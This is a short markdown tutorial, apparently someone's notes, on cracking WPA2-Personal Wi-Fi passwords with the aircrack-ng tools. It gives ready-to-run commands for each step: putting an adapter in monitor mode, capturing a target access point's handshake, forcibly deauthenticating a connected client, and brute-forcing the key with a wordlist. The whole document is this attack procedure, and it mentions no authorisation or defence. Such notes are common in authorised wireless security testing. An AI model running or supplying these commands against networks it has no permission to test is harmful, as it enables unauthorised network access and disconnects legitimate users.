# WPA2 Cracking

> **Tested on WPA2-Personal @ 2.4GHz**

```bash
iwconfig -> Shows Wireless Interfaces.
```

Find the wireless interface that supports monitor mode and packet injection.

## 1. **Turning on the monitor mode**

```bash
sudo airmon-ng start wlan0
```

The interface name might change.

## 2. **Airodump-NG**

### Monitoring Wireless Traffic

Monitor the traffic and extract the required information about the target, such as `bssid` and `channel`.

```bash
sudo airodump-ng wlan0mon
```

You might also want to find the correct target by modifying the band using `--band <a/b/g>` or `-b <a/b/g>`. The default is `bg` (i.e., 2.4 GHz). **I was not able to test it on dual-band (802.11n) or 5 GHz. I suspect that my wireless adapter may not support packet injection on the 5 GHz band.**

### Dumping the Traffic

After selecting the target, we may want to capture its EAPOL handshake. This can be achieved either by deauthenticating a connected client and waiting for it to reconnect, or by passively waiting for a legitimate client to initiate a new connection.

We can also use the ESSID instead of the BSSID if there are no other access points with the same ESSID. However, using the BSSID is generally more precise because it uniquely identifies a specific access point, whereas multiple access points can share the same ESSID (for example, in extended or enterprise networks).

```bash
sudo airodump-ng --bssid F6:88:80:9E:73:0A -c 11 wlan0mon -w ~/Downloads/cap1
```

## 3. **Deauthenticating the client**

While the `airodump-ng` is looking for the EAPOL handshake, open another terminal.

```bash
sudo aireplay-ng --deauth 100 -a F6:88:80:9E:73:0A -c de:df:df:69:ab:31 wlan0mon
```

* **`-a`** -> `BSSID` of the Access Point
* **`-c`** -> `BSSID` of the target client
* **`--deauth`** ->  count of the attempts. 0 for indefinate.

> **mdk4** can also be used for this purpose.

## 4. **Cracking**

After capturing the EAPOL handshake, we can either convert the `.cap` file to the `.hc22000` format (required for Hashcat) using a tool such as `hcxpcapngtool` and then use Hashcat, or use `aircrack‑ng` directly with the captured file.

```bash
aircrack-ng -w word.list -b F6:88:80:9E:73:0A ./cap/cap1-01.cap
```

---
